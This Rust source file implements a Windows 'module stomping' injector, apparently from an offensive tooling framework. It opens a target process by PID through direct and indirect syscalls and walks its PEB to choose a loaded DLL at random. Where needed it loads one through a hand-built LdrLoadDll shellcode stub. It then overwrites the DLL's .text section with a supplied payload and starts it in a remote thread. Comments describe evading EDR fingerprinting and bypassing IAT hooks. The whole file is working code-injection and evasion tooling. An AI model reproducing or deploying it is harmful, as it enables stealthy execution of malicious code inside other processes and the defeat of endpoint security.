use crate::injection::Injector;
use anyhow::{anyhow, Result};

pub struct ModuleStompInjector;

// ─── Windows-only code ──────────────────────────────────────────────────

#[cfg(windows)]
use crate::injection::payload_has_valid_pe_headers;

#[cfg(windows)]
use std::mem::size_of;

/// Candidate DLL discovered during PEB walk.
#[cfg(windows)]
struct DllCandidate {
    name: String,
    base: usize,
    text_rva: u32,
    text_size: u32,
}

/// Build a `Vec<DllCandidate>` by walking the InLoadOrderModuleList of the
/// **target** process's PEB.  Each candidate's `.text` section must be at
/// least `min_text_size` bytes and the DLL must not match any exclusion.
#[cfg(windows)]
unsafe fn collect_peb_candidates(
    h_proc: *mut winapi::ctypes::c_void,
    peb_addr: usize,
    min_text_size: usize,
    exclusions: &[String],
    builtin_exclusions: &[&str],
) -> Result<Vec<DllCandidate>> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    // Read Ldr pointer from PEB
    let mut ldr_ptr = 0usize;
    let (s, _) = nt_read_proc!(h_proc, (peb_addr + 0x18) as u64, &mut ldr_ptr);
    if s < 0 || ldr_ptr == 0 {
        return Err(anyhow!("Failed to read target Ldr pointer (status={:#x})", s));
    }

    let list_head = ldr_ptr + 0x10; // InLoadOrderModuleList
    let mut flink = 0usize;
    nt_read_proc!(h_proc, list_head as u64, &mut flink);

    let mut candidates = Vec::new();
    let mut current = flink;

    while current != list_head && current != 0 {
        let mut entry = [0u8; 0x70];
        let (s, _) = nt_read_proc!(h_proc, current as u64, entry.as_mut_ptr(), entry.len());
        if s < 0 {
            break;
        }

        let dll_base = u64::from_le_bytes(entry[0x30..0x38].try_into().unwrap()) as usize;
        let name_len = u16::from_le_bytes(entry[0x48..0x4A].try_into().unwrap()) as usize;
        let name_buf = u64::from_le_bytes(entry[0x50..0x58].try_into().unwrap()) as usize;

        if dll_base != 0 && name_len > 0 && name_buf != 0 {
            let mut name_wide = vec![0u16; name_len / 2];
            nt_read_proc!(h_proc, name_buf as u64, name_wide.as_mut_ptr() as *mut u8, name_len);
            let name_str = String::from_utf16_lossy(&name_wide);
            let lname = name_str.to_ascii_lowercase();

            // Extract just the filename component (strip path)
            let base_name = lname.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(&lname);

            if !common::config::is_dll_excluded(base_name, exclusions, builtin_exclusions) {
                // Read PE headers from target process to check .text section
                let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
                if s >= 0 && dos_header.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                    let nt_addr = dll_base + dos_header.e_lfanew as usize;
                    let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                    let (s, _) = nt_read_proc!(h_proc, nt_addr as u64, &mut nt_headers);
                    if s >= 0 {
                        let ns = nt_headers.FileHeader.NumberOfSections as usize;
                        let sec_base = nt_addr
                            + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
                            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

                        for i in 0..ns {
                            let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                            let (s, _) = nt_read_proc!(
                                h_proc,
                                (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as u64,
                                &mut sec
                            );
                            if s < 0 {
                                break;
                            }
                            if &sec.Name[..5] == b".text"
                                && *sec.Misc.VirtualSize() as usize >= min_text_size
                            {
                                candidates.push(DllCandidate {
                                    name: name_str.clone(),
                                    base: dll_base,
                                    text_rva: sec.VirtualAddress,
                                    text_size: *sec.Misc.VirtualSize(),
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }

        let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
        if next_flink == current {
            break;
        }
        current = next_flink;
    }

    Ok(candidates)
}

// ─── NT memory-operation macros (module-local, Windows only) ──────────

/// NtReadVirtualMemory — returns (ntstatus, bytes_read).
#[cfg(windows)]
macro_rules! nt_read_proc {
    ($hproc:expr, $base:expr, $buf:expr) => {{
        let mut _br: usize = 0;
        let _s = syscall!(
            "NtReadVirtualMemory",
            $hproc as u64, $base as u64,
            $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
            &mut _br as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _br)
    }};
    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
        let mut _br: usize = 0;
        let _s = syscall!(
            "NtReadVirtualMemory",
            $hproc as u64, $base as u64,
            $buf as *mut _ as u64, $len as u64,
            &mut _br as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _br)
    }};
}

/// NtWriteVirtualMemory — returns (ntstatus, bytes_written).
#[cfg(windows)]
macro_rules! nt_write_proc {
    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
        let mut _bw: usize = 0;
        let _s = syscall!(
            "NtWriteVirtualMemory",
            $hproc as u64, $base as u64,
            $buf as *const _ as u64, $len as u64,
            &mut _bw as *mut _ as u64,
        );
        (_s.unwrap_or(-1), _bw)
    }};
}

/// NtAllocateVirtualMemory — returns pointer or null.
#[cfg(windows)]
macro_rules! nt_alloc_proc {
    ($hproc:expr, $size:expr, $prot:expr) => {{
        let mut _base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut _sz: usize = $size;
        let _s = syscall!(
            "NtAllocateVirtualMemory",
            $hproc as u64, &mut _base as *mut _ as u64,
            0u64, &mut _sz as *mut _ as u64,
            (winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE) as u64,
            $prot as u64,
        );
        if _s.unwrap_or(-1) < 0 || _base.is_null() {
            std::ptr::null_mut()
        } else {
            _base
        }
    }};
}

/// NtFreeVirtualMemory (MEM_RELEASE).
#[cfg(windows)]
macro_rules! nt_free_proc {
    ($hproc:expr, $base:expr) => {{
        let mut _fb = $base as usize;
        let mut _fs: usize = 0;
        syscall!(
            "NtFreeVirtualMemory",
            $hproc as u64, &mut _fb as *mut _ as u64,
            &mut _fs as *mut _ as u64, 0x8000u64,
        ).ok();
    }};
}

/// NtProtectVirtualMemory — returns ntstatus.
#[cfg(windows)]
macro_rules! nt_protect_proc {
    ($hproc:expr, $base:expr, $size:expr, $new_prot:expr) => {{
        let mut _pb = $base as usize;
        let mut _ps = $size;
        let mut _old: u32 = 0;
        let _s = syscall!(
            "NtProtectVirtualMemory",
            $hproc as u64, &mut _pb as *mut _ as u64,
            &mut _ps as *mut _ as u64,
            $new_prot as u64, &mut _old as *mut _ as u64,
        );
        _s.unwrap_or(-1)
    }};
}

// ─── Windows implementation ─────────────────────────────────────────────

#[cfg(windows)]
impl Injector for ModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::winnt::{
            IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
        };
        use winapi::um::winnt::{
            PAGE_EXECUTE_READ, PAGE_READWRITE,
        };
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE, THREAD_TERMINATE,
        };

        // Minimal thread access mask for NtCreateThreadEx:
        // SYNCHRONIZE (0x100000) – WaitForSingleObject
        // THREAD_TERMINATE (0x0001) – NtTerminateThread fallback on timeout
        const THREAD_ACCESS_WAITABLE: u32 = SYNCHRONIZE | THREAD_TERMINATE;
        // Minimal mask when we only close the handle (no wait).
        const THREAD_ACCESS_FIRE_AND_FORGET: u32 = SYNCHRONIZE;

        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            log::info!(
                "PE payload detected, forwarding to process hollowing's inject_into_process"
            );
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        // The shellcode stub built below is x86_64 machine code.  Reject the
        // call at runtime on any other architecture to prevent the CPU from
        // executing garbage bytes (L-05 fix).
        #[cfg(not(target_arch = "x86_64"))]
        return Err(anyhow!(
            "ModuleStompInjector: shellcode stub requires x86_64; unsupported architecture"
        ));

        // ── Load configuration ─────────────────────────────────────────────
        let injection_cfg = &crate::config::load_config()
            .map(|c| c.injection)
            .unwrap_or_default();

        let sacrificial_candidates = &injection_cfg.sacrificial_dll_candidates;
        let operator_exclusions = &injection_cfg.dll_exclusion_patterns;
        let builtin_exclusions: &[&str] = if injection_cfg.append_default_exclusions {
            common::config::BUILTIN_DLL_EXCLUSIONS
        } else {
            &[]
        };

        log::debug!(
            "module_stomp: {} sacrificial candidates, {} operator exclusions, {} builtin exclusions",
            sacrificial_candidates.len(),
            operator_exclusions.len(),
            builtin_exclusions.len(),
        );

        // ── Open target process via NtOpenProcess ──────────────────────────
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        unsafe {
            let mut h_proc_val: usize = 0;
            let access_mask = (PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION) as u64;
            let open_status = syscall!(
                "NtOpenProcess",
                &mut h_proc_val as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            match open_status {
                Ok(s) if s >= 0 && h_proc_val != 0 => {}
                Ok(s) => return Err(anyhow!("ModuleStomp: NtOpenProcess returned status {:#x}", s)),
                Err(e) => return Err(anyhow!("ModuleStomp: NtOpenProcess syscall failed: {}", e)),
            }
            let h_proc = h_proc_val as *mut winapi::ctypes::c_void;

            macro_rules! close_h {
                () => { syscall!("NtClose", h_proc as u64).ok(); };
            }
            macro_rules! cleanup_and_err {
                ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
                ($fmt:expr, $($arg:tt)*) => {{ close_h!(); return Err(anyhow!($fmt, $($arg)*)); }};
            }

            // ── Resolve ntdll, LdrLoadDll, NtQueryInformationProcess ─────
            let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("ntdll not found via PEB walk"))?;

            let ldr_load_dll_hash = pe_resolve::hash_str(b"LdrLoadDll\0");
            let ldr_load_dll_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ldr_load_dll_hash)
                .ok_or_else(|| anyhow!("LdrLoadDll not found"))?;

            let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
            let ntqip_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash)
                .ok_or_else(|| anyhow!("NtQueryInformationProcess not found"))?;

            type NtQueryInfoProcess = unsafe extern "system" fn(
                winapi::shared::ntdef::HANDLE,
                u32,
                *mut winapi::ctypes::c_void,
                u32,
                *mut u32,
            ) -> i32;
            let ntqip: NtQueryInfoProcess = std::mem::transmute(ntqip_ptr);

            // ── Get target process PEB address ──────────────────────────────
            let mut pbi = [0u8; 48];
            let mut ret_len = 0u32;
            let qip_status = ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
            if qip_status < 0 {
                cleanup_and_err!(
                    "NtQueryInformationProcess(ProcessBasicInfo) failed: status {:#x}",
                    qip_status
                );
            }
            let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
            if peb_addr == 0 {
                cleanup_and_err!("Failed to get target PEB address (PEB address is null)");
            }

            // ── Walk TARGET process PEB to collect suitable DLLs ────────────
            // H-19 fix: walks the TARGET process PEB (not local gs:[0x30]).
            // We collect ALL candidates and then randomly select one to avoid
            // deterministic selection that EDR could fingerprint.
            let candidates = collect_peb_candidates(
                h_proc,
                peb_addr,
                payload.len(),
                operator_exclusions,
                builtin_exclusions,
            ).map_err(|e| {
                close_h!();
                e
            })?;

            log::debug!(
                "module_stomp: found {} candidate DLLs already loaded in target",
                candidates.len(),
            );

            // Randomly select a candidate from the collected pool.
            let selected = if !candidates.is_empty() {
                let idx = rand::random::<usize>() % candidates.len();
                Some(candidates.into_iter().nth(idx).unwrap())
            } else {
                None
            };

            let mut target_dll_name: Option<String> = selected.as_ref().map(|c| c.name.clone());
            let mut target_base: usize = selected.as_ref().map(|c| c.base).unwrap_or(0);
            let mut text_rva: u32 = selected.as_ref().map(|c| c.text_rva).unwrap_or(0);
            let mut text_size: u32 = selected.as_ref().map(|c| c.text_size).unwrap_or(0);

            // ── If no suitable DLL found, load one via LdrLoadDll ──────────
            if target_base == 0 {
                log::info!(
                    "module_stomp: no pre-loaded DLL has suitable .text, attempting LdrLoadDll fallback"
                );
                const PREFERRED_TEXT_MIN: usize = 256 * 1024;
                const PREFERRED_TEXT_MAX: usize = 2 * 1024 * 1024;
                let mut loaded_ok = false;

                for &candidate in sacrificial_candidates.iter() {
                    let wide: Vec<u16> = candidate
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect();
                    let wide_bytes = wide.len() * 2;
                    let us_offset = wide_bytes;
                    let base_addr_offset = us_offset + 16;
                    let total_remote = base_addr_offset + 8;

                    let remote_buf = nt_alloc_proc!(h_proc, total_remote, PAGE_READWRITE);
                    if remote_buf.is_null() {
                        log::warn!("module_stomp: failed to allocate remote buffer for {}", candidate);
                        continue;
                    }

                    let (s, _) = nt_write_proc!(h_proc, remote_buf, wide.as_ptr() as *const u16, wide_bytes);
                    if s < 0 {
                        log::warn!("module_stomp: failed to write DLL name for {}", candidate);
                        nt_free_proc!(h_proc, remote_buf);
                        continue;
                    }

                    let remote_us_ptr =
                        (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
                    let remote_str_va = remote_buf as usize;
                    let mut us_bytes = [0u8; 16];
                    us_bytes[0..2]
                        .copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
                    us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());
                    us_bytes[8..16]
                        .copy_from_slice(&(remote_str_va as u64).to_le_bytes());
                    let (s, _) = nt_write_proc!(h_proc, remote_us_ptr, us_bytes.as_ptr(), 16);
                    if s < 0 {
                        log::warn!("module_stomp: failed to write UNICODE_STRING for {}", candidate);
                        nt_free_proc!(h_proc, remote_buf);
                        continue;
                    }

                    // Build x64 stub for LdrLoadDll
                    let stub_region = nt_alloc_proc!(h_proc, 256, PAGE_READWRITE);
                    if stub_region.is_null() {
                        log::warn!("module_stomp: failed to allocate stub region for {}", candidate);
                        nt_free_proc!(h_proc, remote_buf);
                        continue;
                    }

                    let ldr_addr = ldr_load_dll_ptr as u64;
                    let us_va = remote_buf as u64;
                    let us_struct_va = us_va + us_offset as u64;
                    let base_out_va = us_va + base_addr_offset as u64;

                    let mut stub = Vec::<u8>::with_capacity(64);
                    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
                    stub.extend_from_slice(&[0x33, 0xC9]); // xor ecx, ecx
                    stub.extend_from_slice(&[0x33, 0xD2]); // xor edx, edx
                    stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, <us_struct_va>
                    stub.extend_from_slice(&us_struct_va.to_le_bytes());
                    stub.extend_from_slice(&[0x49, 0xB9]); // mov r9, <base_out_va>
                    stub.extend_from_slice(&base_out_va.to_le_bytes());
                    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ldr_addr>
                    stub.extend_from_slice(&ldr_addr.to_le_bytes());
                    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
                    stub.push(0xC3); // ret

                    let (s, _) = nt_write_proc!(h_proc, stub_region, stub.as_ptr(), stub.len());
                    if s < 0 {
                        log::warn!("module_stomp: failed to write LdrLoadDll stub for {}", candidate);
                        nt_free_proc!(h_proc, stub_region);
                        nt_free_proc!(h_proc, remote_buf);
                        continue;
                    }

                    let prot_status = nt_protect_proc!(h_proc, stub_region, stub.len(), PAGE_EXECUTE_READ);
                    if prot_status < 0 {
                        log::warn!(
                            "module_stomp: NtProtectVirtualMemory on stub failed {:#x} for {}",
                            prot_status, candidate
                        );
                        nt_free_proc!(h_proc, stub_region);
                        nt_free_proc!(h_proc, remote_buf);
                        continue;
                    }

                    // Execute the LdrLoadDll stub via indirect syscall
                    // (NtCreateThreadEx resolved through nt_syscall which uses
                    // SSN + syscall gadget, not through IAT).
                    let mut h_thread: usize = 0;
                    let thread_status = syscall!(
                        "NtCreateThreadEx",
                        &mut h_thread as *mut _ as u64,
                        THREAD_ACCESS_WAITABLE as u64,
                        0u64, // ObjectAttributes
                        h_proc as u64,
                        stub_region as u64,
                        0u64, // StartParameter
                        0u64, // CreateSuspendedFlags
                        0u64, // ZeroBits
                        0u64, // StackSize
                        0u64, // MaximumStackSize
                        0u64, // AttributeList
                    );
                    let h_thread = h_thread as *mut winapi::ctypes::c_void;

                    match thread_status {
                        Ok(s) if s >= 0 && !h_thread.is_null() => {
                            const LDRLOADDLL_TIMEOUT_MS: u32 = 30_000;
                            let wait = winapi::um::synchapi::WaitForSingleObject(
                                h_thread,
                                LDRLOADDLL_TIMEOUT_MS,
                            );
                            if wait == winapi::um::winbase::WAIT_TIMEOUT {
                                log::warn!(
                                    "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                    LDRLOADDLL_TIMEOUT_MS, candidate
                                );
                                syscall!(
                                    "NtTerminateThread",
                                    h_thread as u64,
                                    1u64
                                ).ok();
                            } else if wait != 0 {
                                log::warn!(
                                    "module_stomp: WaitForSingleObject returned {} for {}",
                                    wait, candidate
                                );
                            }
                            syscall!("NtClose", h_thread as u64).ok();
                        }
                        Ok(s) => {
                            log::warn!(
                                "module_stomp: NtCreateThreadEx for LdrLoadDll returned status {:#x} for {}",
                                s, candidate
                            );
                        }
                        Err(e) => {
                            log::warn!(
                                "module_stomp: NtCreateThreadEx syscall failed: {} for {}",
                                e, candidate
                            );
                        }
                    }
                    nt_free_proc!(h_proc, stub_region);
                    nt_free_proc!(h_proc, remote_buf);

                    // Re-walk target PEB to find the newly loaded DLL.
                    let new_candidates = collect_peb_candidates(
                        h_proc,
                        peb_addr,
                        payload.len(),
                        operator_exclusions,
                        builtin_exclusions,
                    ).unwrap_or_default();

                    // Find the one matching our candidate name
                    for c in new_candidates {
                        let lcand = candidate.to_ascii_lowercase();
                        let ldll = c.name.to_ascii_lowercase();
                        // The loaded module name may include a full path; compare just the filename
                        let dll_file = ldll.rsplit(|ch| ch == '\\' || ch == '/').next().unwrap_or(&ldll);
                        if dll_file.trim_end_matches('\0').eq_ignore_ascii_case(&lcand) {
                            let in_preferred_band = (c.text_size as usize) >= PREFERRED_TEXT_MIN
                                && (c.text_size as usize) <= PREFERRED_TEXT_MAX;
                            let payload_fits = (c.text_size as usize) >= payload.len();

                            if payload_fits
                                && (in_preferred_band || payload.len() > PREFERRED_TEXT_MAX)
                            {
                                target_dll_name = Some(c.name);
                                target_base = c.base;
                                text_rva = c.text_rva;
                                text_size = c.text_size;
                                loaded_ok = true;
                                break;
                            }
                        }
                    }
                    if loaded_ok {
                        break;
                    }
                }

                if target_base == 0 {
                    cleanup_and_err!(
                        "ModuleStompInjector: no loaded module with a .text section large enough \
                         to accommodate the payload ({} bytes)",
                        payload.len()
                    );
                }
            }

            log::info!(
                "module_stomp: selected '{}' at {:#x} (.text RVA={:#x}, size={} bytes) for {}-byte payload",
                target_dll_name.as_deref().unwrap_or("(unknown)"),
                target_base,
                text_rva,
                text_size,
                payload.len(),
            );

            // ── Validate .text section (may already be set from PEB walk) ──
            if text_rva == 0 {
                // Re-read from target DLL as fallback
                let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                let (s, _) = nt_read_proc!(h_proc, target_base as u64, &mut dos_header);
                if s < 0 || dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                    cleanup_and_err!("Invalid DOS signature on target DLL");
                }
                let nt_addr = target_base + dos_header.e_lfanew as usize;
                let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                let (s, _) = nt_read_proc!(h_proc, nt_addr as u64, &mut nt_headers);
                if s < 0 {
                    cleanup_and_err!("Failed to read NT headers of target DLL");
                }
                let sec_base = nt_addr
                    + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
                    + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

                for i in 0..nt_headers.FileHeader.NumberOfSections as usize {
                    let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                    let (s, _) = nt_read_proc!(
                        h_proc,
                        (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as u64,
                        &mut sec
                    );
                    if s < 0 {
                        break;
                    }
                    if &sec.Name[..5] == b".text" {
                        text_rva = sec.VirtualAddress;
                        text_size = *sec.Misc.VirtualSize();
                        break;
                    }
                }
                if text_rva == 0 {
                    cleanup_and_err!("Failed to find .text section of target DLL");
                }
            }

            if payload.len() > text_size as usize {
                cleanup_and_err!(
                    "Payload ({} bytes) larger than target .text section ({} bytes)",
                    payload.len(), text_size
                );
            }

            // ── Stomp .text section only ────────────────────────────────────
            // Change protection to RW, write shellcode, restore to RX.
            // Only the .text section is modified — the rest of the DLL image
            // remains untouched, preserving module integrity for EDR scanners.
            let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;

            let rw_status = nt_protect_proc!(h_proc, target_addr, payload.len(), PAGE_READWRITE);
            if rw_status < 0 {
                cleanup_and_err!(
                    "NtProtectVirtualMemory(RW) on .text failed: status {:#x}",
                    rw_status
                );
            }

            let (write_status, bytes_written) =
                nt_write_proc!(h_proc, target_addr, payload.as_ptr(), payload.len());
            if write_status < 0 || bytes_written != payload.len() {
                // Attempt to restore protection before failing
                nt_protect_proc!(h_proc, target_addr, text_size as usize, PAGE_EXECUTE_READ);
                cleanup_and_err!(
                    "NtWriteVirtualMemory failed: status {:#x}, wrote {} of {} bytes",
                    write_status, bytes_written, payload.len()
                );
            }

            let rx_status = nt_protect_proc!(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READ);
            if rx_status < 0 {
                cleanup_and_err!(
                    "NtProtectVirtualMemory(RX) on .text failed: status {:#x}",
                    rx_status
                );
            }

            // Flush I-cache (defense-in-depth on ARM64, no-op on x86_64).
            syscall!(
                "NtFlushInstructionCache",
                h_proc as u64, target_addr as u64, payload.len() as u64,
            ).ok();

            // ── Execute via NtCreateThreadEx (indirect syscall) ─────────────
            // The syscall! macro resolves NtCreateThreadEx's SSN
            // and dispatches through a syscall gadget in ntdll, bypassing any
            // IAT hooks on CreateRemoteThread or NtCreateThreadEx.
            let mut h_exec_thread: usize = 0;
            let exec_status = syscall!(
                "NtCreateThreadEx",
                &mut h_exec_thread as *mut _ as u64,
                THREAD_ACCESS_FIRE_AND_FORGET as u64,
                0u64, // ObjectAttributes
                h_proc as u64,
                target_addr as u64,
                0u64, // StartParameter
                0u64, // CreateSuspendedFlags
                0u64, // ZeroBits
                0u64, // StackSize
                0u64, // MaximumStackSize
                0u64, // AttributeList
            );
            let h_exec_thread = h_exec_thread as *mut winapi::ctypes::c_void;

            match exec_status {
                Ok(s) if s >= 0 && !h_exec_thread.is_null() => {
                    syscall!("NtClose", h_exec_thread as u64).ok();
                }
                Ok(s) => {
                    cleanup_and_err!(
                        "NtCreateThreadEx execution failed with status {:#x}",
                        s
                    );
                }
                Err(e) => {
                    cleanup_and_err!(
                        "NtCreateThreadEx indirect syscall failed: {}",
                        e
                    );
                }
            }

            log::info!(
                "module_stomp: successfully injected {}-byte payload into '{}'",
                payload.len(),
                target_dll_name.as_deref().unwrap_or("(unknown)"),
            );

            close_h!();
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Module Stomping only supported on Windows"))
    }
}
